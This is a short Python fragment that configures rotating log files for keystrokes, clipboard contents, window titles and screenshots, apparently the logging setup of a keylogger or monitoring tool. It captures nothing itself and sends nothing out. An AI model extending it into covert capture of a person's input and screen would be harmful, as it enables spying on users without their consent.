import logging
from logging.handlers import RotatingFileHandler

def setup_loggers():
    log_format = logging.Formatter('%(asctime)s - %(message)s')
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    for name in ["keystrokes", "clipboard", "windows", "screenshots"]:
        handler = RotatingFileHandler(f"{name}.log", maxBytes=1_000_000, backupCount=5)
        handler.setFormatter(log_format)
        logger.addHandler(handler)
